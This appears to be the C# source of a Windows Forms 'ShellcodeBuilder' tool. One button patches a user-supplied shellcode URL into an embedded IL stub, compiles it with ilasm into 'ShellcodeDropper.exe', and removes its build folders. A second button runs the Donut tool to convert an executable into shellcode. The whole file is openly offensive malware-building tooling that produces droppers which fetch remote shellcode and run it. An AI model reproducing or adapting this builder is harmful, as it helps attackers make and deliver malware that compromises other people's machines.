using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.IO.Compression;
using System.Diagnostics;

namespace ShellcodeBuilder
{
    public partial class Form1 : MetroFramework.Forms.MetroForm
    {
        public Form1()
        {
            InitializeComponent();
        }
        private void buildBtn_Click(object sender, EventArgs e)
        {
            string linkShellcode = linkShellcode_box.Text;

            if (string.IsNullOrEmpty(linkShellcode))
            {
                MessageBox.Show("Forms cannot be empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            byte[] stubBytes = Resource1.Stub;

            string zipFilePath = Path.Combine(Environment.CurrentDirectory, "stub.zip");
            File.WriteAllBytes(zipFilePath, stubBytes);

            ZipFile.ExtractToDirectory(zipFilePath, Environment.CurrentDirectory);
            File.Delete(zipFilePath);

            string tempFilePath = CreateTempFile(linkShellcode);


            if (tempFilePath != null)
            {
                string exeFilePath = CompileTempFile(tempFilePath);
                if (exeFilePath != null)
                {
                    CleanupDirectories();
                    SaveCompiledFile(exeFilePath);
                }
            }
            linkShellcode_box.Clear();
        }

        private string CreateTempFile(string linkShellcode)
        {
            string stubFolder = Path.Combine(Environment.CurrentDirectory, "stub");
            string stubFilePath = Path.Combine(stubFolder, "stub.il");
            string tempFilePath = Path.Combine(stubFolder, "stub_temp.il");

            try
            {
                string stubContent = File.ReadAllText(stubFilePath);
                stubContent = stubContent.Replace("OVER_LINK", linkShellcode);

                File.WriteAllText(tempFilePath, stubContent);
                return tempFilePath;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error creating temp file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
        }

        private string CompileTempFile(string tempFilePath)
        {
            string exeFilePath = Path.Combine(Environment.CurrentDirectory, "stub.exe");
            string ilasmPath = Path.Combine(Environment.CurrentDirectory, "compilator", "ilasm.exe");

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = ilasmPath;
                startInfo.Arguments = $"{tempFilePath} /output={exeFilePath}";
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                startInfo.CreateNoWindow = true;

                using (Process process = Process.Start(startInfo))
                {
                    process.WaitForExit();
                    if (process.ExitCode != 0)
                    {
                        MessageBox.Show("Error compiling temp.il", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return null;
                    }
                }

                return exeFilePath;
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error compiling temp file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }
        }

        private void SaveCompiledFile(string exeFilePath)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Executable Files (*.exe)|*.exe";
            saveFileDialog.Title = "Save compiled file";
            saveFileDialog.FileName = "ShellcodeDropper.exe";

            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.Move(exeFilePath, saveFileDialog.FileName);
                    MessageBox.Show("File saved successfully!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error saving compiled file: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void CleanupDirectories()
        {
            try
            {
                string stubFolder = Path.Combine(Environment.CurrentDirectory, "stub");
                string compilatorFolder = Path.Combine(Environment.CurrentDirectory, "compilator");
                Directory.Delete(stubFolder, true);
                Directory.Delete(compilatorFolder, true);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error cleaning up directories: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }



        //START SHELLCODE GENERATOR
        private void buildBinFile_Click(object sender, EventArgs e)
        {
            string exeFile = fileToBin_box.Text;
            string entrophy = entropyBox.Text;
            string Directory_Donut = Path.Combine(Environment.CurrentDirectory, "donut");

            if (string.IsNullOrEmpty(exeFile) || string.IsNullOrEmpty(entrophy))
            {
                MessageBox.Show("Forms cannot be empty!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            byte[] stubBytes = Resource1.donut;
            string zipFilePath = Path.Combine(Environment.CurrentDirectory, "donut.zip");
            File.WriteAllBytes(zipFilePath, stubBytes);

            ZipFile.ExtractToDirectory(zipFilePath, Directory_Donut);
            File.Delete(zipFilePath);

            string donutExePath = Path.Combine(Directory_Donut, "donut.exe");
            string outputPath = GetOutputFilePath();

            if (outputPath == null)
            {
                Directory.Delete(Directory_Donut, true);
                return;
            }

            string arguments = $"-i \"{exeFile}\" --entrophy:{entrophy} --output:{outputPath}";
            ExecuteCommand(donutExePath, arguments);
            Directory.Delete(Directory_Donut, true);
            fileToBin_box.Clear();
        }

        private void openFile_btn_Click(object sender, EventArgs e)
        {
            OpenFileDialog openExeFile = new OpenFileDialog();
            openExeFile.Filter = "Executable Files (*.exe)|*.exe";
            openExeFile.Title = "Open executeable file";
            openExeFile.FileName = "";

            if (openExeFile.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    fileToBin_box.Text = openExeFile.FileName;
                }
                catch
                {
                    MessageBox.Show($"Select file does not exists!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private string GetOutputFilePath()
        {
            // Открыть диалог сохранения файла
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "Binary Files (*.bin)|*.bin";
            saveFileDialog.Title = "Save Output File";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                return saveFileDialog.FileName;
            }
            else
            {
                return null;
            }
        }

        private void ExecuteCommand(string filePath, string arguments)
        {
            try
            {
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName = filePath;
                psi.Arguments = arguments;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.CreateNoWindow = true;

                System.Diagnostics.Process process = new System.Diagnostics.Process();
                process.StartInfo = psi;
                process.Start();
                process.WaitForExit();
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void label4_Click(object sender, EventArgs e)
        {
            Process.Start("https://github.com/k3rnel-dev");
        }
    }
}
